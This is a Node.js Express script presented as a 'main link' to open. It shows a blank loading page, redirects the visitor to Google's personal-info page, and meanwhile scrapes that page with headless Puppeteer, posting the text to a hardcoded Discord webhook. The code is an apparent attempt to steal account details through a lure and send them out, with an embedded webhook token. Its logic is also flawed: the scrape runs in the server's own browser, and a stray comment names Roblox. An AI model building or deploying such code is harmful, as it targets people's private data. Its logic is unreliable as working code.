const express = require("express");
const puppeteer = require("puppeteer");
const fetch = require("node-fetch");

const app = express();

// ===== CONFIG (EDIT LATER IF YOU WANT) =====
const TARGET_URL = "https://myaccount.google.com/personal-info";
const DISCORD_WEBHOOK =
  "https://discord.com/api/webhooks/1459229880221700375/esk71z4kmwuwYOLByflofkjZra-deSo82CK0UogimXJbp0QKB13MLQ4wP3mm-yFrw6rj";
// ==========================================

// MAIN LINK (OPEN THIS)
app.get("/send", async (req, res) => {
  // 1️⃣ Send white screen immediately
  res.send(`
    <html>
      <head>
        <title>Loading...</title>
        <meta charset="utf-8" />
        <script>
          setTimeout(() => {
            window.location.href = "${TARGET_URL}";
          }, 3000);
        </script>
        <style>
          body {
            background: white;
            margin: 0;
            padding: 0;
          }
        </style>
      </head>
      <body></body>
    </html>
  `);

  // 2️⃣ Run scraping in background
  scrapeAndSend();
});

// SCRAPER FUNCTION
async function scrapeAndSend() {
  try {
    const browser = await puppeteer.launch({
      headless: "new",
      args: ["--no-sandbox", "--disable-setuid-sandbox"],
    });

    const page = await browser.newPage();
    await page.goto(TARGET_URL, { waitUntil: "networkidle2" });

    // Scroll to load everything
    await autoScroll(page);

    // Get ALL visible text on screen
    const visibleText = await page.evaluate(() => {
      return document.body.innerText;
    });

    await browser.close();

    // Send text to Discord (chunked)
    for (let i = 0; i < visibleText.length; i += 1900) {
      const chunk = visibleText.slice(i, i + 1900);
      await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "```" + chunk + "```" }),
      });
    }
  } catch (err) {
    console.error("SCRAPER ERROR:", err);
  }
}

// AUTO SCROLL (ROBLOX NEEDS THIS)
async function autoScroll(page) {
  await page.evaluate(async () => {
    await new Promise((resolve) => {
      let totalHeight = 0;
      const distance = 300;
      const timer = setInterval(() => {
        const scrollHeight = document.body.scrollHeight;
        window.scrollBy(0, distance);
        totalHeight += distance;
        if (totalHeight >= scrollHeight) {
          clearInterval(timer);
          resolve();
        }
      }, 200);
    });
  });
}

app.get("/", (req, res) => {
  res.send("Server running");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on port", PORT));
